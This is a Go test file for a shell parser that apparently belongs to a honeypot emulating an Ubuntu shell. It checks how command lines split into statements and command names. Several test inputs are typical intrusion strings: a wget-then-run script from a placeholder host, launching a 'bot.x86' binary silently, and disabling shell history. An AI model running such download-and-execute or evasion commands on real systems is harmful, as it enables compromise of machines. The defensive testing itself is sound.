package shell

import (
	"reflect"
	"testing"
)

func TestSplitStatementsNewline(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want []statement
	}{
		{"lf", "uname -a\nid", []statement{{"", "uname -a"}, {";", "id"}}},
		{"crlf", "uname -a\r\nid", []statement{{"", "uname -a"}, {";", "id"}}},
		{"blank lines", "\n\nid\n\n", []statement{{"", "id"}}},
		{"inside quotes", "echo 'a\nb'", []statement{{"", "echo 'a\nb'"}}},
		{"after &&", "true &&\nid", []statement{{"", "true"}, {"&&", "id"}}},
		{"mixed", "cd /tmp\nwget x; sh x", []statement{{"", "cd /tmp"}, {";", "wget x"}, {";", "sh x"}}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := splitStatements(tc.in)
			if !reflect.DeepEqual(got, tc.want) {
				t.Fatalf("splitStatements(%q) = %#v, want %#v", tc.in, got, tc.want)
			}
		})
	}
}

func TestRunNewlineSeparatedCommands(t *testing.T) {
	s := NewInterpreter("ubuntu")
	out, _, _ := s.Run("echo one\necho two")
	if out != "one\r\ntwo" {
		t.Fatalf("expected two statements, got %q", out)
	}
}

func TestParseCommands(t *testing.T) {
	cases := []struct {
		in        string
		wantNames []string
		wantArgs0 []string
	}{
		{"uname -a", []string{"uname"}, []string{"-a"}},
		{"/bin/./uname -s -m", []string{"uname"}, []string{"-s", "-m"}},
		{"cd /tmp; wget http://x/a.sh && sh a.sh", []string{"cd", "wget", "sh"}, []string{"/tmp"}},
		{"cat /proc/cpuinfo | grep name | wc -l", []string{"cat", "grep", "wc"}, []string{"/proc/cpuinfo"}},
		{"LC_ALL=C HISTFILE=/dev/null ls -la", []string{"ls"}, []string{"-la"}},
		{"cd /tmp\n./bot.x86 > /dev/null 2>&1", []string{"cd", "bot.x86"}, []string{"/tmp"}},
		{"'/usr/bin/id'", []string{"id"}, []string{}},
		{"if [ -f /x ]; then wget a; else curl b; fi", []string{"[", "wget", "curl"}, []string{"-f", "/x", "]"}},
		{"case $(uname -m) in x86_64) wget a;; *) curl b;; esac", []string{"wget", "curl"}, []string{"a"}},
		{"{ cd /tmp; sh x; }", []string{"cd", "sh"}, []string{"/tmp"}},
		{"echo a; fi", []string{"echo", "fi"}, []string{"a"}},
		{"FOO=bar", nil, nil},
		{"   ", nil, nil},
	}
	for _, tc := range cases {
		t.Run(tc.in, func(t *testing.T) {
			got := ParseCommands(tc.in)
			var names []string
			for _, c := range got {
				names = append(names, c.Name)
			}
			if !reflect.DeepEqual(names, tc.wantNames) {
				t.Fatalf("names = %q, want %q", names, tc.wantNames)
			}
			if len(got) > 0 && !reflect.DeepEqual(got[0].Args, tc.wantArgs0) {
				t.Fatalf("args[0] = %q, want %q", got[0].Args, tc.wantArgs0)
			}
		})
	}
}
